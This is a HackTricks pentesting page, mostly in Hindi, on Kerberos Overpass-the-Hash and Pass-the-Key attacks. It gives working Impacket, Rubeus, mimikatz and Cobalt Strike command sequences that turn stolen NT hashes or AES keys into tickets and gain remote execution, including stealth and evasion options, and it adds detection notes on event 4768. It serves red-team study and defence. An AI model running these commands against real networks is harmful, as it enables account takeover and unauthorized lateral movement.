# Over Pass the Hash/Pass the Key

{{#include ../../banners/hacktricks-training.md}}


## Overpass The Hash/Pass The Key (PTK)

**Overpass The Hash/Pass The Key (PTK)** attack उन environments के लिए design किया गया है जहाँ traditional NTLM protocol restricted है और Kerberos authentication को प्राथमिकता दी जाती है। यह attack किसी user के NTLM hash या AES keys का उपयोग करके Kerberos tickets प्राप्त करता है, जिससे network के भीतर resources तक unauthorized access संभव हो जाता है।

Strictly speaking:

- **Over-Pass-the-Hash** का सामान्य अर्थ **NT hash** को **RC4-HMAC** Kerberos key के माध्यम से Kerberos TGT में बदलना है।
- **Pass-the-Key** अधिक generic version है, जहाँ आपके पास पहले से कोई Kerberos key, जैसे **AES128/AES256**, होती है और आप सीधे उसके साथ TGT request करते हैं।

यह अंतर hardened environments में महत्वपूर्ण है: यदि **RC4 is disabled** है या KDC द्वारा अब इसे assumed नहीं किया जाता, तो केवल **NT hash** पर्याप्त नहीं होता और आपको **AES key** (या उसे derive करने के लिए cleartext password) की आवश्यकता होती है।

इस attack को execute करने के लिए initial step में targeted user के account का NTLM hash या password प्राप्त करना शामिल है। यह information प्राप्त करने के बाद, उस account के लिए Ticket Granting Ticket (TGT) प्राप्त किया जा सकता है, जिससे attacker उन services या machines तक access कर सकता है जिनकी permissions user के पास हैं।

Process को निम्नलिखित commands के साथ शुरू किया जा सकता है:<sup>[[1]](#references)</sup>
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
AES256 की आवश्यकता वाले scenarios के लिए, `-aesKey [AES key]` option का उपयोग किया जा सकता है:<sup>[[1]](#references)</sup>
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -aesKey <AES256_HEX>
export KRB5CCNAME=velociraptor.ccache
python wmiexec.py -k -no-pass jurassic.park/velociraptor@labwws02.jurassic.park
```
`getTGT.py` `-service <SPN>` के साथ **AS-REQ के माध्यम से सीधे service ticket का अनुरोध** करने का भी समर्थन करता है, जो तब उपयोगी हो सकता है जब आपको अतिरिक्त TGS-REQ के बिना किसी विशिष्ट SPN के लिए ticket चाहिए:
```bash
python getTGT.py -dc-ip 10.10.10.10 -aesKey <AES256_HEX> -service cifs/labwws02.jurassic.park jurassic.park/velociraptor
```
इसके अलावा, प्राप्त किया गया ticket `smbexec.py` या `wmiexec.py` जैसे विभिन्न tools के साथ इस्तेमाल किया जा सकता है, जिससे attack का दायरा बढ़ जाता है।

_PyAsn1Error_ या _KDC cannot find the name_ जैसी समस्याएं आमतौर पर Impacket library को update करने या IP address के बजाय hostname का इस्तेमाल करने से हल हो जाती हैं, जिससे Kerberos KDC के साथ compatibility सुनिश्चित होती है।

Rubeus.exe का इस्तेमाल करने वाला एक वैकल्पिक command sequence इस technique का एक अन्य पहलू दिखाता है:<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
यह method **Pass the Key** approach को mirror करता है, जिसमें ticket को सीधे authentication purposes के लिए commandeer और utilize करने पर focus किया जाता है। व्यवहार में:

- `Rubeus asktgt` स्वयं **raw Kerberos AS-REQ/AS-REP** भेजता है और इसे admin rights की आवश्यकता नहीं होती, जब तक कि आप `/luid` के साथ किसी अन्य logon session को target करना या `/createnetonly` के साथ एक अलग session बनाना न चाहें।
- `mimikatz sekurlsa::pth` credential material को logon session में patch करता है और इसलिए **LSASS** को **touch** करता है, जिसके लिए आमतौर पर local admin या `SYSTEM` की आवश्यकता होती है और EDR के दृष्टिकोण से यह अधिक noisy होता है।

Mimikatz के साथ उदाहरण:
```bash
sekurlsa::pth /user:velociraptor /domain:jurassic.park /ntlm:2a3de7fe356ee524cc9f3d579f2e0aa7 /run:cmd.exe
sekurlsa::pth /user:velociraptor /domain:jurassic.park /aes256:<AES256_HEX> /run:cmd.exe
```
Operational security का पालन करने और AES256 का उपयोग करने के लिए, निम्नलिखित command लागू की जा सकती है:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
`/opsec` relevant है क्योंकि Rubeus-generated traffic native Windows Kerberos से थोड़ा अलग होता है। यह भी ध्यान दें कि `/opsec` का उद्देश्य **AES256** traffic के लिए है; इसे RC4 के साथ उपयोग करने के लिए आमतौर पर `/force` की आवश्यकता होती है, जिससे इसका काफी उद्देश्य समाप्त हो जाता है क्योंकि **आधुनिक domains में RC4 स्वयं एक strong signal है**।

## Detection notes

हर TGT request DC पर **event `4768`** generate करती है। Current Windows builds में इस event में पुराने writeups की तुलना में अधिक उपयोगी fields होती हैं:

- `TicketEncryptionType` बताता है कि issued TGT के लिए कौन-सा enctype उपयोग किया गया था। सामान्य values **RC4-HMAC** के लिए `0x17`, **AES128** के लिए `0x11`, और **AES256** के लिए `0x12` हैं।<sup>[[3]](#references)</sup>
- Updated events `SessionKeyEncryptionType`, `PreAuthEncryptionType`, और client द्वारा advertised enctypes भी expose करते हैं, जिससे **real RC4 dependence** को confusing legacy defaults से अलग करना आसान होता है।
- आधुनिक environment में `0x17` दिखना एक अच्छा clue है कि account, host, या KDC fallback path अभी भी RC4 की अनुमति देता है और इसलिए NT-hash-based Over-Pass-the-Hash के लिए अधिक अनुकूल है।

Microsoft November 2022 के Kerberos hardening updates के बाद से RC4-by-default behavior को लगातार कम कर रहा है, और current published guidance यह है कि **Q2 2026 के अंत तक AD DCs के लिए RC4 को default assumed enctype के रूप में हटा दिया जाए**। Offensive perspective से इसका अर्थ है कि **AES के साथ Pass-the-Key** तेजी से reliable path बन रहा है, जबकि classic **NT-hash-only OpTH** hardened estates में अधिक बार fail होता रहेगा।<sup>[[3]](#references)</sup>

Kerberos encryption types और related ticketing behaviour के अधिक details के लिए देखें:

{{#ref}}
kerberos-authentication.md
{{#endref}}

## अधिक stealthy version

> [!WARNING]
> हर logon session में एक समय में केवल एक active TGT हो सकता है, इसलिए सावधान रहें।

1. Cobalt Strike से **`make_token`** का उपयोग करके एक नया logon session बनाएँ।
2. फिर, existing session को प्रभावित किए बिना नए logon session के लिए TGT generate करने हेतु Rubeus का उपयोग करें।

Rubeus से ही sacrificial **logon type 9** session के साथ similar isolation प्राप्त की जा सकती है:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES256_HEX> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
यह current session TGT को overwrite करने से बचाता है और आमतौर पर ticket को आपके मौजूदा logon session में import करने से अधिक सुरक्षित होता है।

## संदर्भ

- [1] [Tarlogic - Kerberos (II): ¿Cómo atacar Kerberos?](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
- [2] [GhostPack - Rubeus (GitHub repository)](https://github.com/GhostPack/Rubeus)
- [3] [Microsoft Learn - Detect and Remediate RC4 Usage in Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)

{{#include ../../banners/hacktricks-training.md}}
